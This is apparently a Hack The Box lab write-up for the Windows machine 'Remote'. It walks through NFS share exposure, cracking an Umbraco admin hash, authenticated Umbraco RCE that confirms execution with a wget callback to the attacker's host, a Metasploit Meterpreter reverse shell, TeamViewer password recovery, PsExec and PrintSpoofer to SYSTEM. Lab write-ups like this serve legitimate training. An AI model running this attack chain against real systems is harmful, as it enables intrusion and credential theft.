# Hack The Box - Remote

![Hack The Box](https://img.shields.io/badge/Hack%20The%20Box-Remote-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=black)
![Operating System](https://img.shields.io/badge/OS-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![Web](https://img.shields.io/badge/Focus-Web-red?style=for-the-badge)

> **Remote** is an Easy-difficulty Windows machine that features an Umbraco CMS installation. Credentials are discovered through a world-readable NFS share and used to authenticate to the CMS. An authenticated Remote Code Execution vulnerability in Umbraco provides the initial foothold. Post-exploitation enumeration reveals a vulnerable TeamViewer installation whose stored password is reused by the local Administrator account, allowing a successful PsExec attack and resulting in a SYSTEM shell.



## Machine Information

| Property | Value |
|---|---|
| **Machine** | **Remote** |
| **Platform** | Hack The Box |
| **OS** | Windows |
| **Difficulty** | Easy |
| **IP Address** | `10.129.230.172` |
| **Primary Focus** | Web Exploitation |
| **Vulnerabilities** | Umbraco RCE / TeamViewer Credential Exposure |
| **Initial Access** | NFS Enumeration → Umbraco CMS → RCE |
| **Privilege Escalation** | TeamViewer Password Reuse → PsExec |

---

## Machine Information

| Property | Value |
|---|---|
| **Machine** | Remote |
| **Platform** | Hack The Box |
| **Operating System** | Windows |
| **Difficulty** | Easy |
| **Target IP** | `10.129.230.172` |
| **Hostname** | Remote |
| **Focus** | NFS Enumeration / CMS Exploitation / Credential Gathering / Privilege Escalation |

---

## Attack Path

```text
Nmap
  │
  ├── FTP Anonymous Access
  │
  ├── IIS / Web Enumeration
  │       │
  │       └── Umbraco CMS
  │
  └── NFS Enumeration
          │
          └── site_backups
                  │
                  └── Umbraco.sdf
                          │
                          └── Admin Credentials
                                  │
                                  └── Umbraco 7.12.4
                                          │
                                          └── Authenticated RCE
                                                  │
                                                  └── Initial Shell
                                                          │
                                                          └── TeamViewer 7
                                                                  │
                                                                  └── Stored Password
                                                                          │
                                                                          └── Administrator
                                                                                  │
                                                                                  └── PsExec
                                                                                          │
                                                                                          └── SYSTEM
````

---

# Enumeration

## Nmap

The initial Nmap scan reveals that the target is a Windows host exposing several common services, including FTP, IIS, SMB and NFS.

```bash
nmap -sS -sV -sC -p- --min-rate 5000 10.129.230.172 -oN nmap
```

<img width="956" height="785" alt="image" src="https://github.com/user-attachments/assets/d725b97f-58fd-4c6f-b489-ab2ce6fdde76" />


The scan identifies the following relevant services:

| Port   | Service | Description              |
| ------ | ------- | ------------------------ |
| `21`   | FTP     | Anonymous access enabled |
| `80`   | HTTP    | IIS Web Server           |
| `111`  | RPCBind | NFS-related service      |
| `139`  | NetBIOS | SMB                      |
| `445`  | SMB     | Microsoft-DS             |
| `2049` | NFS     | Network File System      |

The FTP service allows anonymous authentication.

```text
Username: anonymous
Password: anonymous
```

After connecting to FTP, no useful files were found, so the service was set aside for the time being.

---

# Web Enumeration

## IIS

Browsing to port 80 reveals a web store.

The page contains an **Intranet** section, but there is little useful information available directly from the website.

Directory enumeration is performed using Gobuster.

```bash
gobuster dir -u http://10.129.230.172/ -w /usr/share/wordlists/dirb/common.txt
```

The scan reveals an interesting directory:

```text
/umbraco
```

<img width="951" height="739" alt="image" src="https://github.com/user-attachments/assets/5adf299e-f9d7-48ec-b1c1-a3ba93f4407b" />



Navigating to the directory reveals an **Umbraco CMS** installation.

Initial attempts using common default credentials were unsuccessful:

```text
admin / admin
admin / test
administrator / password
admin / password
root / password
```

---

# NFS Enumeration

NFS shares can be enumerated using `showmount`.

First, install the required package:

```bash
sudo apt install nfs-common
```

Enumerate the exported NFS shares:

```bash
showmount -e 10.129.230.172
```
<img width="962" height="84" alt="image" src="https://github.com/user-attachments/assets/e95f55a2-1287-4a3a-a32e-ef0e2cb0da00" />



The target exposes a share named:

```text
/site_backups
```

The share is world-readable and can be mounted locally.

Create a mount point:

```bash
mkdir backups
```

Mount the NFS share:

```bash
sudo mount -t nfs 10.129.230.172:/site_backups backups/
```

<img width="961" height="228" alt="image" src="https://github.com/user-attachments/assets/ee3acbfd-c492-4a1a-8ae9-485d7c047003" />


After mounting the share, an Umbraco directory is discovered.

```bash
ls
```

---

# Credential Discovery

Umbraco stores important application data inside the `App_Data` directory.

One of the relevant files is:

```text
Umbraco.sdf
```

The database can be searched for administrative credentials using `strings`.

```bash
strings Umbraco.sdf | grep admin
```

The output reveals an administrative username and a SHA1 password hash:

```text
Username: admin@htb.local
```

The recovered hash is:

```text
b8be16afba8c314ad33d812f22a04991b90e2aaa
```

<img width="959" height="200" alt="image" src="https://github.com/user-attachments/assets/4ed04496-2cd4-41ee-b9ce-41afcb021e6c" />


Save the hash locally:

```bash
echo -n 'b8be16afba8c314ad33d812f22a04991b90e2aaa' > hash
```

Crack the SHA1 hash using John the Ripper:

```bash
john hash --format=Raw-SHA1 --wordlist=/usr/share/wordlists/rockyou.txt
```

The recovered password is:

```text
baconandcheese
```

<img width="956" height="229" alt="image" src="https://github.com/user-attachments/assets/0a9f24c5-06fc-4c0f-be27-4dffa3be3fd7" />


We now have valid Umbraco credentials:

```text
Username: admin@htb.local
Password: baconandcheese
```

---

# Foothold

## Umbraco CMS

Using the recovered credentials, we can authenticate to the Umbraco administration panel.

```text
admin@htb.local : baconandcheese
```

The Help section reveals the installed Umbraco version:

```text
Umbraco 7.12.4
```

This version is vulnerable to an authenticated Remote Code Execution vulnerability.

A public exploit can be used after modifying the login credentials and target host.

The relevant exploit configuration is:

```python
login = "admin@htb.local"
password = "baconandcheese"
host = "http://10.129.230.172"
```

Before attempting to obtain a reverse shell, the vulnerability can be validated by modifying the payload to make a request to our attacking machine.

For example:

```python
cmd = "wget 10.10.14.65/rce"
```

A listener can then be started on the attacking machine.

Once the exploit is executed, a request is received, confirming that the target is vulnerable to authenticated RCE.

---

# Reverse Shell

Metasploit's `web_delivery` module can be used to generate a PowerShell payload.

Start Metasploit:

```bash
msfconsole
```

Configure the module:

```text
use exploit/multi/script/web_delivery
set RHOSTS 10.129.230.172
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set target 2
run
```

The generated PowerShell payload is then inserted into the Umbraco exploit.

After executing the exploit, a Meterpreter session is received.

```text
sessions -i 1
```

The session is running under the IIS application pool identity:

```text
apppool\defaultapppool
```

At this point, we have obtained our initial foothold on the machine.

---

<img width="953" height="590" alt="image" src="https://github.com/user-attachments/assets/b0c4c7dd-fce4-4ab3-82d2-8ceda8287aad" />


# User Flag

The user flag is located in the Public users directory:

```text
C:\Users\Public
```

The `user.txt` file can be retrieved from this location.

---

# Privilege Escalation

With a foothold established, the next step is to enumerate the host and identify interesting services.

A TeamViewer service is discovered.

The service description indicates that **TeamViewer 7** is installed.

<img width="952" height="594" alt="image" src="https://github.com/user-attachments/assets/54942265-8c18-43e2-af4b-a83d05109946" />


The installed version can be confirmed using PowerShell:

```powershell
(Get-Command "C:\Program Files (x86)\TeamViewer\Version7\TeamViewer.exe").Version
```

The installed version is:

```text
TeamViewer 7
```

TeamViewer 7 is vulnerable to credential recovery due to the way passwords are stored in the Windows Registry.

The relevant vulnerable versions store AES-128-CBC encrypted passwords using known cryptographic parameters.

---

# TeamViewer Password Extraction

The Meterpreter session can be backgrounded:

```text
meterpreter > bg
```

Metasploit provides a post-exploitation module to recover TeamViewer credentials:

```text
use post/windows/gather/credentials/teamviewer_passwords
set SESSION 1
run
```

The module successfully retrieves the stored TeamViewer password:

```text
!R3m0te!
```

The TeamViewer password itself does not immediately provide administrator access.

However, password reuse is a common issue, so the recovered password can be tested against the local Administrator account.

---

# Administrator Access

Because SMB is available, Metasploit's PsExec module can be used to authenticate as the local Administrator using the recovered password.

```text
use exploit/windows/smb/psexec
set RHOSTS 10.129.230.172
set SMBPass !R3m0te!
set SMBUser administrator
set LHOST tun0
run
```

The credentials are accepted successfully.

PsExec provides a shell running with SYSTEM privileges.

```text
NT AUTHORITY\SYSTEM
```

<img width="956" height="443" alt="image" src="https://github.com/user-attachments/assets/0004f894-06a4-455d-8fdf-cefae8ec2e05" />


The machine has now been fully compromised.

---

# Root Flag

With SYSTEM-level access, navigate to the Administrator's Desktop:

```text
C:\Users\Administrator\Desktop
```

The `root.txt` flag is located there.

---

# Alternate Privilege Escalation Method

An alternative route to SYSTEM access is possible by abusing the privileges of the IIS application pool account.

The current user can be checked with:

```cmd
whoami
```

The account is:

```text
iis apppool\defaultapppool
```

Checking the account privileges reveals:

```text
SeImpersonatePrivilege
```

The operating system is Windows Server 2019.

```text
Windows Server 2019
```

The `SeImpersonatePrivilege` privilege can be abused using **PrintSpoofer** to impersonate a privileged token and obtain a SYSTEM shell.

The PrintSpoofer project can be compiled and uploaded to the target.

Once transferred, it can be executed from the compromised host to obtain:

```text
NT AUTHORITY\SYSTEM
```

This provides an alternative path to full system compromise without relying on the recovered TeamViewer password.

---

# Flags

| Flag     | Location                                  |
| -------- | ----------------------------------------- |
| **User** | `C:\Users\Public\user.txt`                |
| **Root** | `C:\Users\Administrator\Desktop\root.txt` |

---

# Credentials & Hashes

| Username          | Password / Hash  | Source                         |
| ----------------- | ---------------- | ------------------------------ |
| `admin@htb.local` | `baconandcheese` | Umbraco.sdf / SHA1 cracking    |
| `administrator`   | `!R3m0te!`       | TeamViewer credential recovery |

---

# Key Takeaways

* Anonymous FTP access should always be checked during enumeration.
* NFS shares can expose sensitive application backups when incorrectly configured.
* World-readable backups may contain databases and credentials.
* Umbraco CMS stores important information inside `App_Data`.
* Password hashes found in application databases can sometimes be cracked offline.
* Authenticated CMS vulnerabilities can provide an initial foothold.
* Software versions should always be enumerated during post-exploitation.
* Vulnerable TeamViewer installations can expose stored credentials.
* Password reuse can turn a low-privileged credential into administrator access.
* `SeImpersonatePrivilege` is a powerful Windows privilege that can be abused for local privilege escalation.
* PrintSpoofer can be used to exploit impersonation privileges on vulnerable Windows systems.

---

# Tools Used

* Nmap
* FTP
* Gobuster
* NFS / showmount
* strings
* John the Ripper
* Umbraco CMS
* Metasploit
* Meterpreter
* TeamViewer credential recovery
* PsExec
* PrintSpoofer

---

# MITRE ATT&CK Techniques

| Technique     | Description                                          |
| ------------- | ---------------------------------------------------- |
| **T1046**     | Network Service Scanning                             |
| **T1083**     | File and Directory Discovery                         |
| **T1552.001** | Unsecured Credentials: Credentials In Files          |
| **T1190**     | Exploit Public-Facing Application                    |
| **T1059.001** | Command and Scripting Interpreter: PowerShell        |
| **T1053**     | Scheduled Task/Job                                   |
| **T1003**     | OS Credential Dumping                                |
| **T1078**     | Valid Accounts                                       |
| **T1550**     | Use Alternate Authentication Material                |
| **T1134.001** | Access Token Manipulation: Token Impersonation/Theft |
| **T1068**     | Exploitation for Privilege Escalation                |

---

# Conclusion

Remote demonstrates how multiple security weaknesses can be chained together to fully compromise a Windows server.

The attack begins with service enumeration and the discovery of a world-readable NFS share. The exposed backup contains the Umbraco application database, which reveals an administrator password hash. After cracking the hash, valid Umbraco credentials are obtained.

The vulnerable Umbraco 7.12.4 installation is then exploited to achieve Remote Code Execution and obtain an initial shell as the IIS application pool account.

Post-exploitation enumeration reveals an outdated TeamViewer installation. Its stored password is recovered and found to be reused by the local Administrator account. Using these credentials with PsExec results in a SYSTEM shell and complete compromise of the machine.

An alternative escalation path is also available through `SeImpersonatePrivilege` and PrintSpoofer.

```text
NFS Exposure
     ↓
Umbraco Database
     ↓
Credential Recovery
     ↓
Umbraco RCE
     ↓
IIS AppPool Shell
     ↓
TeamViewer Password
     ↓
Password Reuse
     ↓
Administrator
     ↓
PsExec
     ↓
SYSTEM
```

---

**Hack The Box - Remote**
**Difficulty:** Easy
**OS:** Windows
**Target:** `10.129.230.172`
**Focus:** NFS Enumeration · Umbraco CMS · RCE · Credential Recovery · Privilege Escalation

```
```
